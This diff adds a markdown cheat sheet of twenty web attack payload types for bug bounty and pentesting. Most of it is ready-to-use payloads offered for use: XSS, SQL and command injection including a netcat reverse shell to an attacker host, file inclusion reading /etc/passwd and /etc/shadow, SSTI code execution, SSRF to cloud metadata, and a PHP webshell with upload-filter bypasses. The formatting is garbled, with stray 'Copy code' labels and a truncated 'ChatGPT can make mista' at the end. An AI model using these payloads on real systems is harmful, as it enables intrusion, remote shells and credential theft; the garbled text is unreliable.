@@ -1,0 +1,172 @@
+# 🔥 20 Most Common Web Payload Types (Bug Bounty & Pentesting)
+
+A curated and practical list of the 20 most commonly used payload types across bug bounty, CTFs, and penetration testing. Each category includes quick-reference payload examples to accelerate recon, exploitation, and report writing.
+
+---
+
+## 1. 🟨 Cross-Site Scripting (XSS)
+Used to execute JavaScript in a victim’s browser.
+
+```html
+<script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+2. 🟥 SQL Injection (SQLi)
+Manipulates backend SQL queries.
+
+sql
+Copy code
+' OR 1=1 --
+" OR ""="
+admin'--
+3. ⬛ Command Injection
+Executed when user input is passed to OS commands.
+
+bash
+Copy code
+; id
+&& whoami
+| nc -e /bin/sh attacker:4444
+
+4. 📂 Local File Inclusion (LFI)
+bash
+Copy code
+../../../../etc/passwd
+..%2f..%2f..%2fetc/passwd
+php://filter/convert.base64-encode/resource=index.php
+
+
+5. 🌐 Remote File Inclusion (RFI)
+text
+Copy code
+http://attacker.com/shell.txt
+
+
+6. 🟧 Server-Side Template Injection (SSTI)
+jinja
+Copy code
+{{7*7}}
+{{self.__class__.__mro__[1].__subclasses__()[40]('id').read()}}
+
+
+7. 🟦 Cross-Site Request Forgery (CSRF)
+html
+Copy code
+<form action="https://target.com/delete" method="POST">
+  <input type="hidden" name="id" value="1">
+</form>
+<script>document.forms[0].submit()</script>
+
+
+8. 🔁 Open Redirect
+text
+Copy code
+?redirect=https://evil.com
+?next=//evil.com
+
+
+9. 📦 Deserialization Payloads
+php
+Copy code
+O:8:"Exploit":0:{}
+
+
+10. 📁 Path Traversal
+text
+Copy code
+../../../etc/shadow
+..%2f..%2f..%2fetc/passwd
+
+
+11. 📜 XML External Entity (XXE)
+xml
+Copy code
+<!DOCTYPE foo [ <!ENTITY x SYSTEM "file:///etc/passwd"> ]>
+<root>&x;</root>
+
+
+12. 🌍 Server-Side Request Forgery (SSRF)
+text
+Copy code
+http://127.0.0.1:80/admin
+http://169.254.169.254/latest/meta-data/
+
+
+13. 📨 HTTP Request Smuggling (CL/TE)
+makefile
+Copy code
+POST / HTTP/1.1
+Content-Length: 5
+Transfer-Encoding: chunked
+
+
+14. 🔓 Authentication Bypass
+json
+Copy code
+{"role":"admin"}
+true == true
+admin:admin
+
+
+15. 🗃️ NoSQL Injection (MongoDB / Firebase)
+json
+Copy code
+{"$ne": null}
+{"$gt": ""}
+{"username": {"$regex": ".*"}}
+
+
+16. 🟪 JWT Manipulation
+json
+Copy code
+{"alg":"none"}
+Or re-sign token with weak HMAC secrets.
+
+17. 🧪 API Fuzzing Payloads
+csharp
+Copy code
+null
+[]
+{}
+"test"
+9999999999999
+
+
+18. 🔤 Unicode & WAF Bypass Payloads
+text
+Copy code
+%2e%2e%2f
+／etc／passwd
+alert&#40;1&#41;
+
+
+19. 🧨 ReDoS (Regex Denial of Service)
+text
+Copy code
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
+
+
+20. 📤 File Upload Evasion
+PHP webshell:
+php
+Copy code
+<?php system($_GET['cmd']); ?>
+Extensions to bypass filters:
+perl
+Copy code
+shell.php.jpg
+shell.pHp
+shell.php%00.jpg
+
+
+
+
+
+
+
+
+
+
+
+
+ChatGPT can make mista
